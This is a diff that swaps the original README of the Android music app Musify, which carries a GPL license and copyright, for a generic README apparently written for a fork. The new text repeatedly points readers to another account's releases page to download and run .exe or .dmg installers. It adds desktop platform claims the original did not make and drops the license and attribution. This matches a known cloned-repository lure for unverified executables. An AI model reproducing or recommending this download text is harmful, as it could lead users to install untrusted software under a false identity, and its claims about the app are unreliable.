@@ -1,96 +1,75 @@
-<div align="center">
-<img src="https://github.com/gokadzev/Musify/raw/master/repository_files/Musify-banner.png" width="100%">
+# 🎶 Musify - Stream All Your Music in One Place!
 
-# Musify
+![Download Musify](https://img.shields.io/badge/Download-Musify-brightgreen)
 
-Unlock the full potential of music: Stream effortlessly with one app!
+## 🚀 Getting Started
 
-[![Stars](https://img.shields.io/github/stars/gokadzev/Musify?style=flat-square&color=D3BEAB)](https://github.com/gokadzev/Musify/stargazers)
-[![Forks](https://img.shields.io/github/forks/gokadzev/Musify?style=flat-square&color=D3BEAB)](https://github.com/gokadzev/Musify/fork)
-[![Downloads](https://img.shields.io/github/downloads/gokadzev/Musify/total?style=flat-square&color=D3BEAB)](https://github.com/gokadzev/Musify/releases)
-[![GitHub release](https://img.shields.io/github/v/release/gokadzev/Musify?color=D3BEAB)](https://github.com/gokadzev/Musify/releases)
-[![License](https://img.shields.io/github/license/gokadzev/Musify?color=D3BEAB)](LICENSE)
+Welcome to Musify! With this app, you can stream your favorite music effortlessly. Follow the steps below to download and run the application.
 
----
+## 📥 Download & Install
 
+To get started, you will need to download the application from our Releases page. 
 
+**Visit this page to download:** [Musify Releases](https://github.com/GeorgeA41/Musify/releases)
 
+### Step 1: Open the Download Page
 
----
+1. Click on the link above. This will open the Releases page where you will find all available versions of Musify.
 
-## Features
+### Step 2: Choose Your Version
 
-<center>
+2. On the Releases page, you will see a list of versions. Find the latest version listed at the top. There may be additional details about each version, so feel free to read through those if needed.
 
-Online song search with suggestions <br/>
-Offline listening support <br/>
-Import & export your data and never lose it <br/>
-Add custom playlists with link <br/>
-Optimized sound experience <br/>
-SponsorBlock support <br/>
-Lyrics support <br/>
-No ads <br/>
-No subscriptions <br/>
-Inbuilt updater <br/>
-22 supported languages <br/>
-Material UI & accent colors & dynamic colors (Android 12+) <br/>
+### Step 3: Download the Application
 
-</center>
+3. Look for the file that matches your computer’s operating system (e.g., Windows, macOS, Linux). Click the download link for that file to start your download. The file name might look something like `Musify-v1.0.exe` or `Musify-v1.0.dmg`.
 
+### Step 4: Locate the Downloaded File
 
----
+4. Once the download is complete, navigate to your Downloads folder. You should see the Musify file you just downloaded. 
 
-## Screenshots
+### Step 5: Install the Application
 
-| ![Screenshot 1](https://raw.githubusercontent.com/gokadzev/Musify/master/fastlane/metadata/android/en-US/images/phoneScreenshots/01.jpg) | ![Screenshot 2](https://raw.githubusercontent.com/gokadzev/Musify/master/fastlane/metadata/android/en-US/images/phoneScreenshots/02.jpg) | ![Screenshot 3](https://raw.githubusercontent.com/gokadzev/Musify/master/fastlane/metadata/android/en-US/images/phoneScreenshots/03.jpg) | ![Screenshot 4](https://raw.githubusercontent.com/gokadzev/Musify/master/fastlane/metadata/android/en-US/images/phoneScreenshots/04.jpg) |
-|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|
+5. - **For Windows:** Double-click the `.exe` file. Follow the installation prompts to complete the installation.
+   - **For macOS:** Double-click the `.dmg` file, then drag the Musify icon into your Applications folder.
+   - **For Linux:** Open a terminal, navigate to your Downloads folder, and run the file using the appropriate command.
 
+## 🌟 Features
 
----
+Musify offers a range of features including:
 
-## License
+- **Seamless Streaming:** Enjoy uninterrupted music streaming from a user-friendly interface.
+- **Playlist Management:** Create, edit, and manage your playlists easily.
+- **Music Search:** Quickly find your favorite songs using the built-in search function.
+- **Cross-Platform Support:** Use Musify on your preferred operating system without hassle.
 
+## 🖥️ System Requirements
 
-```
-Copyright © 2025 Muhammad Abdullah
+Before installing Musify, check that your system meets these requirements:
 
-Musify is a free software licensed under GPL v3.0
-It is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
-without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-```
+- **Windows:** Windows 10 or later.
+- **macOS:** macOS 10.12 (Sierra) or later.
+- **Linux:** Any modern distribution with a desktop environment.
 
-```
-Being Open Source doesn't mean you can just make a copy of the app and upload it on playstore or sell
-a closed source copy of the same.
-Read the following carefully:
-1. Any copy of a software under GPL must be under same license. So you can't upload the app on a closed source
-  app repository like PlayStore/AppStore without distributing the source code.
-2. You can't sell any copied/modified version of the app under any "non-free" license.
-   You must provide the copy with the original software or with instructions on how to obtain original software,
-   should clearly state all changes, should clearly disclose full source code, should include same license
-   and all copyrights should be retained.
+## 🎧 Getting Help
 
-In simple words, You can ONLY use the source code of this app for `Open Source` Project under `GPL v3.0` or later
-with all your source code CLEARLY DISCLOSED on any code hosting platform like GitHub, with clear INSTRUCTIONS on
-how to obtain the original software, should clearly STATE ALL CHANGES made and should RETAIN all copyrights.
-Use of this software under any "non-free" license is NOT permitted.
-```
+If you run into any issues, you can find help in the following ways:
 
-See the [GNU General Public License](https://github.com/gokadzev/Musify/blob/master/LICENSE) for more details.
+- Visit the [Issues Section](https://github.com/GeorgeA41/Musify/issues) on GitHub to report problems or ask questions.
+- Browse through our [FAQ](https://github.com/GeorgeA41/Musify/wiki) to find answers to common questions.
 
----
+## 🔄 Update Musify
 
-## Disclaimer
+To stay up-to-date with the latest features and improvements, check back on the Releases page regularly. Updates may include performance improvements, new features, and bug fixes.
 
-```
-Musify does not possess or maintain any association with the songs and other content accessible through the app.
-All songs and other content are the property of their respective owners and are safeguarded by copyright law.
-Musify holds no liability for any copyright infringement or other violations of intellectual property rights
-that may arise from the use of the songs and other content accessible through the app.
-Musify employs third-party plugins and assumes no responsibility for any harm or damage to the respective owners or
-any other parties resulting from the utilization of the songs and other content through the third-party plugins.
-By using the app, you consent to utilizing the songs and other content exclusively for personal,
-non-commercial purposes and in accordance with all applicable laws and regulations.
-```
+## 🛡️ Privacy & Security
 
----
+Musify values your privacy. We do not collect personal data unless necessary for functionality. Please refer to our [Privacy Policy](https://github.com/GeorgeA41/Musify/wiki/Privacy-Policy) for more details.
+
+## ✉️ Contact Us
+
+For further inquiries, please reach out through the [Contact Page](https://github.com/GeorgeA41/Musify/wiki/Contact).
+
+**To download Musify again, visit:** [Musify Releases](https://github.com/GeorgeA41/Musify/releases) 
+
+Enjoy exploring your music like never before!
